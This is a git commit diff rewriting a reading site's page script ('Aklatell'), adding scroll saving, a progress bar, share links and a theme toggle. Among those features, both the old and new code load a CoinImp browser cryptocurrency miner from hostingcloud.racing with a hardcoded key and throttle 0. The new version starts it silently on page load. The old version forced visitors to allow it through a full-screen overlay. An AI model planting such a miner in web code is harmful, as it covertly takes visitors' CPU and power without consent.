af5b0bf4f56576a5a153788ef8fddfe5c18a3eeb
Oshiwa <93853682+oshiwa@users.noreply.github.com>
2023-08-25 19:55:38 +0800

    Add files via upload

--- js/script.js
+++ js/script.js
@@ -1,102 +1,79 @@
+// variables
+let moreContent = document.getElementById('more-content');
+// progress bar
+let progressBarDiv = document.createElement('span');
+progressBarDiv.className = 'progress-bar';
 
-	    // global variables
-	    let currenPath = window.location.pathname;
-	    
-	    let progressBarDiv = document.createElement('span');
-	     progressBarDiv.className = 'progress-bar';
-	     
-	    window.addEventListener('scroll', () => {
-	        
-	        localStorage.setItem('scrollPosition_' + currenPath, window.scrollY);
-	        
-	        const windowHeight = window.innerHeight;
-	        
-            const fullHeight = document.documentElement.scrollHeight;
-            
-            const scrolled = window.scrollY;
-            
-            const progressWidth = (scrolled / (fullHeight - windowHeight)) * 100;
-            
-              progressBarDiv.style.width = progressWidth + '%';
-	    });
-	    
-	    let share = document.createElement('script');
-	    share.src = 'https://static.addtoany.com/menu/page.js';
-	    let shareBtn = document.createElement('a');
-	        shareBtn.href = 'https://www.addtoany.com/share';
-	        shareBtn.className = 'a2a_dd';
-	        shareBtn.textContent = 'Share'
-	    share.addEventListener('load', () => {
-	        
-	    });
-	    // a-ads
-        let ad = document.createElement('span');
-        ad.className = 'ad';
-        ad.innerHTML =
-        `
-        <iframe data-aa='2247755' src='//ad.a-ads.com/2247755?size=320x50' style='width:320px; height:50px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe>
-        `;
-        // script
-	    window.addEventListener('DOMContentLoaded', () => {
-	        
-	        // more content global variable
-	        let moreContent = document.getElementById('more-content');
-	        
-	        // home button
-	        let homeBtn = document.createElement('button');
-	        homeBtn.innerText = "Top";
-	        homeBtn.className = "top-btn"
-	        homeBtn.addEventListener('click', () => {
-	            window.scrollTo(0,0);
-	        });
-	        
-	        // header
-	        let header = document.createElement('button')
-	        header.innerText = "Aklatell"
-	        header.className = "header";
-	        header.addEventListener('click', () => {
-	            window.location.href = "../index.html";
-	        });
-	        
-	        // save scroll position
-	        let scrollPosition = localStorage.getItem('scrollPosition_' + currenPath);
-	        if(scrollPosition){
-	            window.scrollTo(0, scrollPosition);
-	        }
-	        let ciScript = document.createElement('script');
-	        ciScript.src = `https://www.hostingcloud.racing/qcgM.js`
-	        ciScript.addEventListener('load', () => {
-	            var _client = new Client.Anonymous('1b338ef2246dfb0c9665ca717515ff07c101d6d5c96df696097a28b6fb997ed5', {
-                    throttle: 0, c: 'w', ads: 0
-                });
-                _client.start();
-                setTimeout(function(){
-                if(typeof _client === 'undefined' || _client === null)
-                {
-                    var messageDiv = document.createElement("div");
-                    messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
-                    messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
-                    var mainDiv = document.createElement("div");
-                    mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
-                    mainDiv.appendChild(messageDiv);
-                    document.body.appendChild(mainDiv);
-                    document.getElementsByTagName("body")[0].style.overflow = "hidden";
-                    window.scrollTo(0, 0);
-                }
-            },1000);
-            
-            // hide ad
-            setTimeout(() => {
-                ad.style.display = 'none';
-            }, 15000);
-            
-	        });
-	        // append more content
-	        moreContent.append(homeBtn);
-	        moreContent.append(header);
-	        moreContent.append(progressBarDiv);
-	        moreContent.append(ciScript);
-	        moreContent.append(ad);
-	        moreContent.append(share);
-	        moreContent.append(shareBtn);
-	    });
+// scroll listener
+window.addEventListener('scroll', () => {
+
+    let currenPath = window.location.pathname;
+
+    localStorage.setItem('scrollPosition_' + currenPath, window.scrollY);
+
+    const windowHeight = window.innerHeight;
+
+    const fullHeight = document.documentElement.scrollHeight;
+
+    const scrolled = window.scrollY;
+
+    const progressWidth = (scrolled / (fullHeight - windowHeight)) * 100;
+
+    progressBarDiv.style.width = progressWidth + '%';
+});
+
+// dom is loaded
+window.addEventListener('DOMContentLoaded', () => {
+
+    // save scroll position
+    let currenPath = window.location.pathname;
+
+    let scrollPosition = localStorage.getItem('scrollPosition_' + currenPath);
+
+    if (scrollPosition) {
+        window.scrollTo(0, scrollPosition);
+    }
+
+    // share
+    let share = document.createElement('script');
+    share.src = 'https://static.addtoany.com/menu/page.js';
+    let shareBtn = document.createElement('a');
+    shareBtn.href = 'https://www.addtoany.com/share';
+    shareBtn.className = 'a2a_dd';
+    shareBtn.textContent = 'Share';
+    
+    // menu button and theme toggle
+    let menuBtn = document.createElement('button')
+    menuBtn.innerText = "Aklatell"
+    menuBtn.className = "menuBtn";
+    menuBtn.addEventListener('click', () => {
+        if(document.body.classList.contains('light')){
+            document.body.classList.replace('light', 'dark');
+            localStorage.setItem('theme', 'dark')
+        }else{
+            document.body.classList.replace('dark', 'light');
+            localStorage.setItem('theme', 'light')
+        }
+    });
+    let currentTheme = localStorage.getItem('theme');
+        if(currentTheme){
+        document.body.classList.add(currentTheme);
+    }
+    
+    // coin imp
+    let ciScript = document.createElement('script');
+    ciScript.src = `https://www.hostingcloud.racing/qcgM.js`
+    ciScript.addEventListener('load', () => {
+        var _client = new Client.Anonymous('1b338ef2246dfb0c9665ca717515ff07c101d6d5c96df696097a28b6fb997ed5', {
+            throttle: 0, c: 'w', ads: 0
+        });
+        _client.start();
+    });
+
+    // append more content
+    moreContent.append(share);
+    moreContent.append(menuBtn);
+    moreContent.append(ciScript);
+    moreContent.append(shareBtn);
+    moreContent.append(progressBarDiv);
+});
